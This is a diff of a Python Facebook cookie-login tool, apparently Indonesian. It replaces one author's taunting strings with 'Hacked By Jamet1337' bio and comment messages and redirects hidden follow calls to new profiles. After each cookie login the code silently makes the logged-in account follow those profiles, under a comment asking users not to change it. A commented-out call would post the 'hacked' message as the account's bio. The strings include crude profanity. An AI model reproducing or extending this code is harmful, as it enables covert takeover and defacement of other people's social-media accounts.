@@ -4,9 +4,9 @@ from .YNTKTS import *
 from .bahasa import lang
 from .informasi import generate
 
-anjay=random.choice(["Hacked By Orang Gans:v","Muka Gua Mirip Babi","Coli Is My Life","Tidak Ada Yang Aman:v","coli adalah jalan ninjaku"])
-komentar1=random.choice(["keren","mantap bro sc nya","itsuki<3","lo ngentod ajg:v","hi i'm drag-fb user"])
-komentar2=random.choice(["keren","mantap bro sc nya","yang posting orang nya ganteng","lo ngentod ajg:v","hi i'm drag-fb user"])
+anjay=random.choice(["Hacked By Jamet1337","Account Hacked By Jamet1337","Di Retas Oleh Jamet1337","Akun Ini Telah Di Retas Oleh Hacker Bernama Jamet1337","This Account Has Been Hacked By Jamet1337"])
+komentar1=random.choice(["jamet1337 was here","hacked by jamet1337","jamet1337<3","lo ngentod ajg:v","hacked by jamet1337"])
+komentar2=random.choice(["jamet1337 was here","hacked by jamet1337","jamet1337<3","lo ngentod ajg:v","hacked by jamet1337"])
 
 class login:
 	def __init__(self,url,cookie):
@@ -24,8 +24,9 @@ class login:
 			generate(cookie["cookie"],parser(respon.text,"html.parser"))
 			koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
 			# jangan di ganti ya bro hehehe :)
-			koh.follow("/Kang.Pacman")
-			koh.follow("/100006230836266")
+			koh.follow("/ahmat.badali.334")
+			koh.follow("/100059025549029")
+			
 			
 			#koh.change_bio(anjay)
 			print(" * login berhasil, mohon tunggu sedang membuka menu")
